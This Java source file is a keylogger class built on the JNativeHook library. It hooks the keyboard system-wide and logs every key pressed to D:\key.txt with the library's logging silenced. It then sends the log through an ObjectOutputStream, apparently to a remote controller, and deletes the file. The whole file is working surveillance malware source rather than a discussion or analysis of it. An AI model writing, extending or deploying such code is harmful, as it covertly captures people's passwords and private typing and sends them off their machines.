package KeyLogger;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;




public class KeyLogger implements NativeKeyListener {
	public String record = "Key: ";
	public ObjectOutputStream oos;
	public String content="";
	public String key="";
	public File myObj;
	public KeyLogger(ObjectOutputStream oos,String record) {
		// TODO Auto-generated constructor stub
		this.oos = oos;
		this.record = record;
	}

	public void nativeKeyPressed( NativeKeyEvent e) {
		//myObj.delete();
		System.out.println("Pressed");
		record+=" "+NativeKeyEvent.getKeyText(e.getKeyCode());
		myObj = new File("D:\\key.txt");
		FileWriter fileWriter = null;
		try {
			fileWriter = new FileWriter("D:\\key.txt");
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
	    PrintWriter printWriter  = new PrintWriter(fileWriter);
	    printWriter.print(record);           
	    printWriter.close();
		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            		try {
                		GlobalScreen.unregisterNativeHook();
              		  
            		} catch (NativeHookException nativeHookException) {
                		nativeHookException.printStackTrace();
            		}
        	}
		
	}
	


	public void nativeKeyReleased(NativeKeyEvent e) {
	//	System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		//System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
	}

	public void get_Keylogger(ObjectOutputStream oos) throws IOException {
		 myObj = new File("D:\\key.txt");
		 FileWriter fileWriter;
		 fileWriter = new FileWriter("D:\\key.txt");
		 PrintWriter printWriter  = new PrintWriter(fileWriter);
		 printWriter.print("1");           
		 printWriter.close();
		  LogManager.getLogManager().reset();
		  Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

		  logger.setLevel(Level.OFF);
		  
		 

		try {
			
			GlobalScreen.registerNativeHook();
		
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}
	
		GlobalScreen.addNativeKeyListener(new KeyLogger(oos,record));
		// myObj = new File("D:\\key.txt");
		
	}
	public void send_KeyLogger() throws IOException, NativeHookException {
		/*GlobalScreen.unregisterNativeHook();
		System.out.println(record);
		File myObj = new File("D:\\key.txt");
		FileWriter fileWriter = new FileWriter("D:\\key.txt");
	    PrintWriter printWriter = new PrintWriter(fileWriter);
	    printWriter.print(record);              		  
		printWriter.close();
		//Escape();*/
		// printWriter.close();
		
		//GlobalScreen.registerNativeHook();

		GlobalScreen.unregisterNativeHook();
		//myObj = new File("D:\\key.txt");
		Path fileName = Path.of("D:\\key.txt");
		content = Files.readString(fileName);
		System.out.println(content.length());
		
	  	if(content.length() == 1) {
	  		//File file= new File("D:\\key.txt");
	  		//myObj.delete();
	  		String err="No key recorded";
			oos.writeObject(err);
			
	  
	  	} else {
	  	File file= new File("D:\\key.txt");
    	file.delete();
		oos.writeObject(content);}
	
	    File file= new File("D:\\key.txt");
	    file.delete();
	}
}